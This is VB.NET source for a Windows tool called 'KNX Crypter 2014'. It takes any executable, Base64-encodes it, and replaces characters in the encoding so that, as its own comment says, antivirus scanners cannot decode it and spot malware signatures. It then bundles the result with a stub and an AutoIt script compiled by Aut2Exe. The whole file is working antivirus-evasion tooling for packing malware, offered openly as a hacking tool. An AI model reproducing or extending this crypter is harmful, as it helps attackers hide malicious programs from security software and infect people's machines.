Imports System.Text

Public Class Form1

    Private Sub ApriFile(ByVal sender As Object, ByVal e As System.EventArgs) Handles OpenToolStripMenuItem.Click, Button1.Click
        Dim openfdlg As New OpenFileDialog           'Open file dialog part , used for selecting files to crypt..  used from Codedom crypter made by pr0t0typ3
        openfdlg.Filter = "Executables *.exe|*.exe"
        If openfdlg.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = openfdlg.FileName
            btnCrypt.Enabled = True
            STABKNXToolStripMenuItem.Enabled = True
            btnGotit.Enabled = True
            GOTITToolStripMenuItem.Enabled = True
        Else : TextBox1.Text = ""
        End If
    End Sub

    Private Sub Generastub(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnStub.Click, StubexeToolStripMenuItem.Click
        makestub()
        MessageBox.Show("File stub.exe created !")
        ProgressBar1.Value = 0
    End Sub

    Private Sub GeneraAutoit(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAutoit.Click, Autoitau3ToolStripMenuItem.Click
        makeautoit()
        MessageBox.Show("File final.au3 created !")
        ProgressBar1.Value = 0
    End Sub

    Private Sub CryptFile(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCrypt.Click, STABKNXToolStripMenuItem.Click
        If checkopen() = True Then
            makecrypt()
            MessageBox.Show("File STAB.KNX created !")
            ProgressBar1.Value = 0
        End If
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        MessageBox.Show("Another Great Toolz from KNX ~ Hacking 4 Freedom", "About KNX Crypter 2014", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
    End Sub

    Private Sub btnGotit_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnGotit.Click, GOTITToolStripMenuItem.Click
        If checkopen() = True Then
            ProgressBar1.Value = 0
            If My.Computer.FileSystem.FileExists("final.au3") = False Then makeautoit()
            ProgressBar1.Value = 25
            If My.Computer.FileSystem.FileExists("STAB.KNX") = False Then makecrypt()
            ProgressBar1.Value = 50
            If My.Computer.FileSystem.FileExists("Stub.exe") = False Then makestub()
            ProgressBar1.Value = 75
            '############ QUI ESEGUIRE COMPILAZIONE DI AUTOIT DA RIGA DI COMANDO #########
            If My.Computer.FileSystem.FileExists("c:\program files (x86)\autoit3\aut2exe\aut2exe.exe") = True Then
                finisci("c:\program files (x86)\autoit3\aut2exe\aut2exe.exe")
            Else
                If MessageBox.Show("Autoit Aut2Exe not found. Do u want manual specify path?", "Fuck! Where is Aut2Exe?", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question) = Windows.Forms.DialogResult.Yes Then
                    Dim thx As New OpenFileDialog
                    thx.Filter = "(exe file)|*.exe"
                    If thx.ShowDialog = Windows.Forms.DialogResult.OK Then
                        finisci(thx.FileName)
                    End If
                Else
                    MessageBox.Show("U Must Manually Compile Final.au3 file, or Just Compact win Winrar or Batch2exe the 2 file Stub.exe and STAB.KNX", "Damn it!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                End If
            End If
            ProgressBar1.Value = 0
        End If
    End Sub

    Private Sub makestub()
        '########### SCRIVO LO STUB NEL FILE STUB.EXE ################################
        ProgressBar1.Value = 0
        ProgressBar1.Value = 10
        Call stubili()
        ProgressBar1.Value = 40
        Dim knx() As Byte = pMCKJTFsrj(Variabile22)
        ProgressBar1.Value = 60
        IO.File.WriteAllBytes("STUB.EXE", knx)
        ProgressBar1.Value = 100
        '#############################################################################
    End Sub

    Private Sub makeautoit()
        ProgressBar1.Value = 0
        Call autoit()
        ProgressBar1.Value = 30
        FileOpen(5, "final.au3", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        ProgressBar1.Value = 60
        FilePut(5, programtext)
        ProgressBar1.Value = 90
        FileClose(5)
        ProgressBar1.Value = 100
    End Sub

    Private Sub pulisci()
        FileSystem.Kill("final.au3")
        FileSystem.Kill("STAB.KNX")
        FileSystem.Kill("Stub.exe")
    End Sub

    Private Sub makecrypt()
        ProgressBar1.Value = 0
        '########### PRENDO IL FILE IN INPUT E LO CRYPTO NEL FILE STAB.KNX ###########
        Dim filesbytes As Byte() = IO.File.ReadAllBytes(TextBox1.Text) ' Reads binary from file , gets its location from textbox1
        ProgressBar1.Value = 10
        Dim lol As String = Convert.ToBase64String(filesbytes) 'Bytes get converted to base64 string 
        ProgressBar1.Value = 50
        IO.File.WriteAllBytes("STAB.KNX", System.Text.Encoding.ASCII.GetBytes(lol.Replace("A", "#33FWQ@"))) 'Converts base64 string to bytes and replaces A's with $ since av's are detecting base64 strings and decodes them looking for signatures of malware
        ProgressBar1.Value = 100
        '#############################################################################
    End Sub

    Private Sub finisci(ByVal path As String)
        ProgressBar1.Value = 0
        Shell(path & " /in final.au3 /out Final.exe")
        pulisci()
        ProgressBar1.Value = 100
        MessageBox.Show("Be water my friend :)", "Thank's my friend")
        ProgressBar1.Value = 0
    End Sub

    Function pMCKJTFsrj(ByVal gSVyrbkuvDFyu As String) As Byte()
        Dim yQhCOKvplEra
        Dim srWUsQeRIQ() As Byte
        gSVyrbkuvDFyu = Replace(gSVyrbkuvDFyu, " ", "")
        ReDim srWUsQeRIQ((Len(gSVyrbkuvDFyu) \ 2) - 1)
        For yQhCOKvplEra = 0 To UBound(srWUsQeRIQ) - 2
            srWUsQeRIQ(yQhCOKvplEra) = CLng("&H" & Mid$(gSVyrbkuvDFyu, 2 * yQhCOKvplEra + 1, 2))
        Next
        pMCKJTFsrj = srWUsQeRIQ
    End Function

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ProgressBar1.Minimum = 0
        ProgressBar1.Maximum = 100
        ProgressBar1.Value = 0
    End Sub

    Private Function checkopen() As Boolean
        If TextBox1.Text = "" Then
            MessageBox.Show("U Must choice a file first!", "Do u have open a file?", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return False
        Else
            Return True
        End If
    End Function
End Class